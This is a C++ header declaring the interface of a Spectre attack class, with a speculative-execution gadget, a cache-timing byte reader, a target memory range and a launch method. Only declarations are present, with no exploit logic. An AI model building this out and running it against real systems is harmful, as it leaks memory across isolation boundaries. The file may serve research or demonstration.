#include <cstdint>
#include <cstdlib>

class crySpectre
{
private:
protected:
    uint32_t interimSize = 128; // Arbitrary
    uint32_t uCacheThreshold;
    void *baseAddr;
    uint64_t addrRange;
    char *interim;
    uint8_t temp = 0; // Stop compiler optimizations removing the gadget
    char *cacher;

public:
    char *results;

private:
protected:
    // readFromMem
    void readMemoryByte(size_t addr, uint8_t val[2], int32_t score[2]);
    void init();    
    void gadget(size_t x);
public:
    crySpectre();
    crySpectre(void *_ba, uint64_t _ar);
    ~crySpectre();

    // Assign base and range pointers
    void target(void *_ba, uint64_t _ar);

    // Attempt to pull off spectre
    bool launch();

    // Display Output
    void report();
};

